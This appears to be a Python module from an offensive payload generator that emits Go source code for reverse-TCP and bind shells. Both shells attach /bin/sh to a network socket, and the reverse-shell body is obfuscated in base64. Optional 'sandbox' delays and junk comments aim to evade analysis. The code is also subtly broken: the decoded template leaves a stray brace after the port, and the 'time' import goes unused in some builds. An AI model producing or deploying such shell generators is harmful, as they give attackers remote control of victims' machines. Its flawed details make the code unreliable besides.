# golang payload generator
# generates go source for reverse/bind shells with optional compilation

import base64
from generators.base import BaseGenerator


class GolangGenerator(BaseGenerator):
    LANG_ID = "go"
    LANG_NAME = "Golang"
    FILE_EXT = ".go"

    def generate(self, host, port, opts, ptype, tpl, adv):
        code = tpl.get("prefix_go", "")
        code += 'package main\nimport ("net"; "os/exec"; "time")\n\n'

        sandbox = opts.get("sandbox", False)
        junk = opts.get("junk", False)

        if sandbox:
            code += "func checkVM() { time.Sleep(2 * time.Second) }\n"

        code += "func main() {\n"
        if sandbox:
            code += "    checkVM()\n"
        if junk:
            code += f"    // {self.rstr(40)}\n"

        if ptype == "reverse_tcp":
            logic = base64.b64decode(
                "YywgXyA6PSBuZXQuRGlhbCgidGNwIiwgInswfTpwMX0iKQpjbWQgOj0gZXhlYy5Db21tYW5k"
                "KCIvYmluL3NoIikKY21kLlN0ZGluID0gYwpjbWQuU3Rkb3V0ID0gYwpjbWQuU3RkZXJyID0g"
                "YwpjbWQuUnVuKCkK"
            ).decode().replace("{0}", host).replace("p1", port)
        elif ptype == "bind_shell":
            logic = (
                f'    ln, _ := net.Listen("tcp", "0.0.0.0:{port}")\n'
                f'    conn, _ := ln.Accept()\n'
                f'    cmd := exec.Command("/bin/sh")\n'
                f'    cmd.Stdin = conn\n    cmd.Stdout = conn\n    cmd.Stderr = conn\n'
                f'    cmd.Run()\n'
            )
        else:
            # fallback to reverse tcp for unsupported types
            logic = base64.b64decode(
                "YywgXyA6PSBuZXQuRGlhbCgidGNwIiwgInswfTpwMX0iKQpjbWQgOj0gZXhlYy5Db21tYW5k"
                "KCIvYmluL3NoIikKY21kLlN0ZGluID0gYwpjbWQuU3Rkb3V0ID0gYwpjbWQuU3RkZXJyID0g"
                "YwpjbWQuUnVuKCkK"
            ).decode().replace("{0}", host).replace("p1", port)

        code += logic + "}\n"
        return code
